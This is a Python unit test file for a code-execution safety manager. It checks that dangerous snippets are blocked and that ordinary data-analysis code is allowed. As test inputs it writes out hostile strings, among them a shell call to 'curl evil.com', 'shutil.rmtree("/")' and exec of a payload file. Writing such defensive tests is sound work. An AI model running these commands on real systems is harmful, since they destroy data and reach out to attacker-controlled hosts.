"""Unit tests for ExecutionSafetyManager — security-critical paths (#224)."""

from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from libs.safety_manager import Decision, ExecutionSafetyManager, SandboxContext


class TestDangerousCodeBlocking(unittest.TestCase):
	def setUp(self):
		self.safety = ExecutionSafetyManager(unsafe_mode=False)

	def test_blocks_os_system_via_assess(self):
		decision = self.safety.assess_execution(
			'import os; os.system("echo hi")', mode="code"
		)
		self.assertFalse(decision.allowed)
		self.assertTrue(len(decision.reasons) > 0)

	def test_blocks_subprocess_shell(self):
		decision = self.safety.assess_execution(
			'import subprocess; subprocess.run("curl evil.com", shell=True)',
			mode="code",
		)
		self.assertFalse(decision.allowed)

	def test_blocks_shutil_rmtree(self):
		self.assertTrue(
			self.safety.is_dangerous_operation('import shutil; shutil.rmtree("/")')
		)
		decision = self.safety.assess_execution(
			'import shutil; shutil.rmtree("/")', mode="code"
		)
		self.assertFalse(decision.allowed)

	def test_allows_safe_pandas(self):
		code = 'import pandas as pd\ndf = pd.read_csv("data.csv")\nprint(df.head())'
		self.assertFalse(self.safety.is_dangerous_operation(code))
		decision = self.safety.assess_execution(code, mode="code")
		self.assertTrue(decision.allowed, decision.reasons)

	def test_allows_matplotlib(self):
		code = "import matplotlib.pyplot as plt\nplt.plot([1,2,3])\nplt.show()"
		self.assertFalse(self.safety.is_dangerous_operation(code))
		decision = self.safety.assess_execution(code, mode="code")
		self.assertTrue(decision.allowed, decision.reasons)

	def test_blocks_exec_dynamic(self):
		decision = self.safety.assess_execution(
			'exec(open("payload.py").read())', mode="code"
		)
		self.assertFalse(decision.allowed)
		self.assertTrue(any("dynamic" in r.lower() or "ast" in r.lower() for r in decision.reasons))

	def test_blocks_os_remove(self):
		self.assertTrue(self.safety.is_dangerous_operation("os.remove('x.txt')"))

	def test_empty_code_not_dangerous(self):
		self.assertFalse(self.safety.is_dangerous_operation(""))
		self.assertFalse(self.safety.is_dangerous_operation("   "))

	def test_unsafe_mode_allows_with_warning(self):
		unsafe = ExecutionSafetyManager(unsafe_mode=True)
		decision = unsafe.assess_execution("shutil.rmtree('/')", mode="code")
		self.assertTrue(decision.allowed)
		self.assertTrue(any("dangerous" in r.lower() for r in decision.reasons))

	def test_command_mode_rejects_multiline(self):
		decision = self.safety.assess_execution("echo a\necho b", mode="command")
		self.assertFalse(decision.allowed)


class TestSandboxAndArtifacts(unittest.TestCase):
	def test_build_sandbox_context(self):
		safety = ExecutionSafetyManager()
		ctx = safety.build_sandbox_context()
		self.assertIsInstance(ctx, SandboxContext)
		self.assertTrue(Path(ctx.cwd).is_dir())
		self.assertIn("PATH", ctx.env)

	def test_export_artifacts(self):
		safety = ExecutionSafetyManager()
		with tempfile.TemporaryDirectory() as sandbox:
			(Path(sandbox) / "plot.png").write_bytes(b"\x89PNG")
			(Path(sandbox) / "notes.txt").write_text("hi", encoding="utf-8")
			(Path(sandbox) / "skip.bin").write_bytes(b"x")
			ctx = SandboxContext(cwd=sandbox, env={})
			with tempfile.TemporaryDirectory() as dest:
				exported = safety.export_artifacts(ctx, dest_dir=dest)
				self.assertIn("plot.png", exported)
				self.assertIn("notes.txt", exported)
				self.assertNotIn("skip.bin", exported)


class TestDecisionDataclass(unittest.TestCase):
	def test_decision_defaults(self):
		d = Decision(allowed=True)
		self.assertTrue(d.allowed)
		self.assertEqual(d.reasons, [])


if __name__ == "__main__":
	unittest.main()
